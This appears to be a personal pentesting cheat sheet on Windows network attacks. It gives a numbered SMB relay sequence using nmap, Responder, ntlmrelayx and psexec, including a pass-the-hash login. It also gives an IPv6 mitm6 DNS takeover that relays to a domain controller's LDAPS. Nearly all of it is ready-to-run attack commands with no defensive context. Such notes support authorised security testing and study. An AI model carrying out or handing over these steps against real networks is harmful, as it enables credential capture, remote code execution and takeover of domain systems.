---
title: SMB RELAY
updated: 2023-09-29 04:59:25Z
created: 2023-09-29 04:55:04Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# SMB RELAY
Note: **SMB signing** must be **disabled** or **not enforced**, relayed user must be **admin** on machine
1. `nmap --script=smb2-security-mode.nse -p445 <target IP>` 
2. Turn SMB and HTTP off in **responder.conf**
3. `sudo responder -i eth0 -dwPv` 
4. `ntlmrelayx.py -tf targets.txt -smb2support`
5. psexec.py DOMAIN/user:'Password1'@targetIP
6. `psexec.py administrator@<target IP> -hashes asdasd688a67d86asd:907809ahdas89daui`

Alternatives: 
- **wmiexec.py**
- **smbexec.py**
***
##  IPv6 mitm DNS takeover
1. `ntlmrelayx.py -6 -t ldaps://<DC IP> -wh fakewpad.DOMAIN.local -l lootme`
2. `sudo mitm6 -d DOMAIN.local`